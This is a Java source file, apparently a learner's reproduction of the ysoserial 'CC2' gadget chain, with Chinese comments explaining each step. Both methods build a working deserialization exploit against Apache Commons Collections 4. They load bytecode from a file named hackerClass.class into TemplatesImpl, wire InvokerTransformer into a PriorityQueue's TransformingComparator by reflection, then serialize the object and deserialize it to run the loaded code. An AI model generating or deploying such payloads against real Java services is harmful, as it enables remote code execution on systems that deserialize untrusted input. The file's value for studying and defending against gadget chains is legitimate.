package cc2;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import toolkit.Seriliazation;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC2Chain {
    private static String bytecodePath = "target/classes/cc2/hackerClass.class";
    public static void main(String[] args) throws Exception {
        // cc2_v0();
        cc2_v1();
    }

    /**
     * cc4 版本上的利用链 — 基于 cc4 修改，避免使用 Transformer 数组
     * 方案 1
     */
    public static void cc2_v0() throws Exception {
        /**
         * cc3 的后半段，动态类加载
         */

        // 需要满足的约束：_name, _bytecodes
        TemplatesImpl templates = new TemplatesImpl();
        Class clazz_templatesImpl = templates.getClass();

        // 赋值
        Field fieldName = clazz_templatesImpl.getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templates, "aaa");;

        Field fieldBytecodes = clazz_templatesImpl.getDeclaredField("_bytecodes");
        fieldBytecodes.setAccessible(true);
        byte[][] bytecodes = new byte[][]{
                Files.readAllBytes(Paths.get(bytecodePath))
        };
        fieldBytecodes.set(templates,  bytecodes);

        InvokerTransformer invokerTransformer =  new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        /**
         * cc4 自己的前半段
         */

        // cc4 前两个方案都用不了
        // 方案 1：没有插入元素
        // 方案 2：元素 template 无法强转 Comparable（在 siftUpComparable 中）
        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1), new CustomComparator());
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        // 第二次插入才会触发，在第一个元素上调用 transform
        // 为什么第二个不会调用？ 加入传入两个 template
        priorityQueue.add(templates);
        priorityQueue.add(1);


        Class clazzTransformingComparator = TransformingComparator.class;
        Field fieldTransformer = clazzTransformingComparator.getDeclaredField("transformer");
        fieldTransformer.setAccessible(true);
        fieldTransformer.set(transformingComparator, invokerTransformer);

        Seriliazation.serialize(priorityQueue);
        Seriliazation.unserialize("ser.bin");
    }

    /**
     * 方案 2：ysoserial 实现版本
     */
    public static void cc2_v1() throws Exception {
        /**
         * cc3 的后半段，动态类加载
         */

        // 需要满足的约束：_name, _bytecodes
        TemplatesImpl templates = new TemplatesImpl();
        Class clazz_templatesImpl = templates.getClass();

        // 赋值
        Field fieldName = clazz_templatesImpl.getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templates, "aaa");;

        Field fieldBytecodes = clazz_templatesImpl.getDeclaredField("_bytecodes");
        fieldBytecodes.setAccessible(true);
        byte[][] bytecodes = new byte[][]{
                Files.readAllBytes(Paths.get(bytecodePath))
        };
        fieldBytecodes.set(templates,  bytecodes);

        InvokerTransformer invokerTransformer =  new InvokerTransformer("toString", new Class[]{}, new Object[]{});

        /**
         * cc4 自己的前半段
         */

        // cc4 前两个方案都用不了
        // 方案 1：没有插入元素
        // 方案 2：元素 template 无法强转 Comparable（在 siftUpComparable 中）
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer, new CustomComparator());
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(1);


        Class clazzInvokeTransformer = InvokerTransformer.class;
        Field fieldIMethodName = clazzInvokeTransformer.getDeclaredField("iMethodName");
        fieldIMethodName.setAccessible(true);
        fieldIMethodName.set(invokerTransformer, "newTransformer");

        Class clazzPriorityQueue = priorityQueue.getClass();
        Field fieldQueue = clazzPriorityQueue.getDeclaredField("queue");
        fieldQueue.setAccessible(true);
        Object[] queue = (Object[]) fieldQueue.get(priorityQueue);
        queue[0] = templates;
        queue[1] = 1;


        Seriliazation.serialize(priorityQueue);
        Seriliazation.unserialize("ser.bin");
    }


    // 自定义 Comparator 来处理转换后的元素比较
    public static class CustomComparator implements Comparator<Object>, Serializable {
        @Override
        public int compare(Object o1, Object o2) {
            // 这里实现自定义的比较逻辑
            // 例如，比较对象的哈希码
            return Integer.compare(o1.hashCode(), o2.hashCode());
        }
    }

}
